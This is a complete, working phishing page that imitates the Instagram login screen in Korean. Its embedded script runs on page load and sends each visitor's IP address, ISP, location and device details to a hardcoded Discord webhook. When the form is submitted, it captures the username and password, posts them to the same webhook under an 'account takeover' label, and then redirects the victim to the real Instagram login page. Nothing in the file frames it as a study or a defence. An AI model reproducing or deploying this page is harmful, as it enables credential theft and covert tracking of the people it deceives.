<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; box-sizing: border-box; text-align: center; }
        .logo-text { font-family: 'Arial', sans-serif; font-size: 35px; font-weight: bold; margin-bottom: 30px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; font-size: 12px; }
        button { width: 100%; padding: 7px; border: none; border-radius: 4px; background-color: #0095f6; color: white; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .separator { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; }
        .separator::before, .separator::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
        .fb-login { color: #385185; font-size: 14px; font-weight: bold; text-decoration: none; display: block; margin-bottom: 20px; }
    </style>
</head>
<body>

    <div class="login-box">
        <div class="logo-text">Instagram</div>
        <form id="combinedForm">
            <input type="text" id="username" placeholder="전화번호, 사용자 이름 또는 이메일" required>
            <input type="password" id="password" placeholder="비밀번호" required>
            <button type="submit">로그인</button>
        </form>
        <div class="separator">또는</div>
        <a href="#" class="fb-login">Facebook으로 로그인</a>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1496848408902635701/ZgBY8ZvNtAWfzET8f-gfooOmHQcZSgvc0ouQLnuHshzy1SVt-NKQjbjmV5RQxQwTndnH";

        // [기능 1] 접속하자마자 IP와 기기 정보 털기
        async function trackVisitor() {
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const data = await ipRes.json();

                const payload = {
                    embeds: [{
                        title: "🚨 [접속 알림] 물고기가 링크를 클릭함!",
                        color: 16776960, // 노란색
                        fields: [
                            { name: "🌐 IP 주소", value: data.ip || "알 수 없음", inline: true },
                            { name: "🏢 통신사(ISP)", value: data.org || "알 수 없음", inline: true },
                            { name: "📍 위치", value: `${data.city}, ${data.region} (${data.country_name})`, inline: false },
                            { name: "📱 기기 정보", value: navigator.userAgent, inline: false }
                        ],
                        timestamp: new Date()
                    }]
                };
                fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
            } catch (e) { console.error("Tracking failed"); }
        }

        // 페이지 로드 시 즉시 실행
        trackVisitor();

        // [기능 2] 아이디/비번 입력 시 털기
        document.getElementById('combinedForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            const payload = {
                embeds: [{
                    title: "✅ [계정 탈취] 아이디와 비번 획득!",
                    color: 16711680, // 빨간색
                    fields: [
                        { name: "👤 아이디", value: user, inline: true },
                        { name: "🔑 비밀번호", value: pass, inline: true }
                    ],
                    footer: { text: "알파 창조자의 전리품" },
                    timestamp: new Date()
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(() => {
                window.location.href = "https://www.instagram.com/accounts/login/";
            });
        });
    </script>
</body>
</html>
